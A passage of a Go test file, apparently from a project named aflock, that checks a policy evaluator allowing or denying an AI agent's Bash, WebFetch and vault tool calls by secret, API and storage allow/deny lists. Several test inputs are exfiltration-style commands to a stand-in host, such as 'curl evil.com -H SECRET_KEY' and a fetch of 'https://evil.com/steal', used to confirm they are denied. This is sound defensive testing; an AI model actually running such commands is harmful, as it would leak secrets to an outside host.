	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://public-bucket/file ."}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for s3://public-bucket, got %s", decision)
	}
}

func TestEvaluateGrants_SecretsAllow(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Secrets: &aflock.AllowDenyPolicy{
				Allow: []string{"ALLOWED_VAR", "SAFE_TOKEN"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Should allow: input contains an allowed pattern
	decision, _ := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $ALLOWED_VAR"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for ALLOWED_VAR, got %s", decision)
	}

	// Should deny: input does not contain any allowed pattern
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $OTHER_VAR"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny when no allow pattern matches, got %s", decision)
	}
	if !strings.Contains(reason, "does not match any allowed secret") {
		t.Errorf("reason should mention 'does not match any allowed secret', got: %s", reason)
	}
}

func TestEvaluateGrants_MultipleCategoriesDeny(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Secrets: &aflock.AllowDenyPolicy{
				Deny: []string{"SECRET_KEY"},
			},
			APIs: &aflock.AllowDenyPolicy{
				Deny: []string{"evil.com"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Secrets check fires first
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl evil.com -H SECRET_KEY"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny, got %s", decision)
	}
	if !strings.Contains(reason, "secret") {
		t.Errorf("secrets deny should fire first, got: %s", reason)
	}

	// Only API pattern matches
	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl evil.com"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny, got %s", decision)
	}
	if !strings.Contains(reason, "API") {
		t.Errorf("API deny should fire, got: %s", reason)
	}
}

func TestEvaluateGrants_NonBashTool(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			APIs: &aflock.AllowDenyPolicy{
				Deny: []string{"evil.com"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Should deny: WebFetch URL contains denied API pattern
	decision, _ := e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://evil.com/api"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for WebFetch to evil.com, got %s", decision)
	}

	// Should allow: safe URL
	decision, _ = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://safe.com/api"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for WebFetch to safe.com, got %s", decision)
	}
}

func TestEvaluateGrants_AllowGlobPatterns(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Secrets: &aflock.AllowDenyPolicy{
				Allow: []string{"vault:secret/data/readonly/*"},
				Deny:  []string{"vault:secret/data/production/*"},
			},
			APIs: &aflock.AllowDenyPolicy{
				Allow: []string{"https://api.anthropic.com/*", "https://csrc.nist.gov/*"},
			},
			Storage: &aflock.AllowDenyPolicy{
				Allow: []string{"s3://attestations/*"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Secrets: allowed path
	decision, reason := e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/readonly/mykey"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for vault readonly, got %s: %s", decision, reason)
	}

	// Secrets: denied path
	decision, reason = e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/production/dbpass"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for vault production, got %s", decision)
	}
	if !strings.Contains(reason, "denied") {
		t.Errorf("expected deny reason to mention 'denied', got: %s", reason)
	}

	// APIs: allowed URL
	decision, reason = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://api.anthropic.com/v1/messages"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for anthropic API, got %s: %s", decision, reason)
	}

	// APIs: denied URL
	decision, reason = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://evil.com/steal"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for evil.com, got %s: %s", decision, reason)
	}

	// Storage: allowed path
	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://attestations/run-1/output.json ."}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for s3://attestations, got %s: %s", decision, reason)
	}

	// Storage: denied path
	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://private-bucket/secrets ."}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for s3://private-bucket, got %s: %s", decision, reason)
	}
}

func TestEvaluateGrants_CrossCategoryNoBleed(t *testing.T) {
	// Regression test: secrets allow-list should NOT block WebFetch URLs
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Secrets: &aflock.AllowDenyPolicy{
				Allow: []string{"vault:secret/data/readonly/*"},
			},
			APIs: &aflock.AllowDenyPolicy{
				Allow: []string{"https://api.anthropic.com/*"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// WebFetch should NOT be blocked by the secrets category
	decision, reason := e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://api.anthropic.com/v1/messages"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("secrets allow-list should not block WebFetch, got %s: %s", decision, reason)
	}

	// Vault read should NOT be blocked by the APIs category
	decision, reason = e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/readonly/key"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("APIs allow-list should not block vault read, got %s: %s", decision, reason)
	}

	// Something that matches neither category should be allowed (no relevant category)
	decision, reason = e.EvaluateGrants("Read", json.RawMessage(`{"file_path": "src/main.go"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("unrelated tool should be allowed when no category matches, got %s: %s", decision, reason)
	}
}
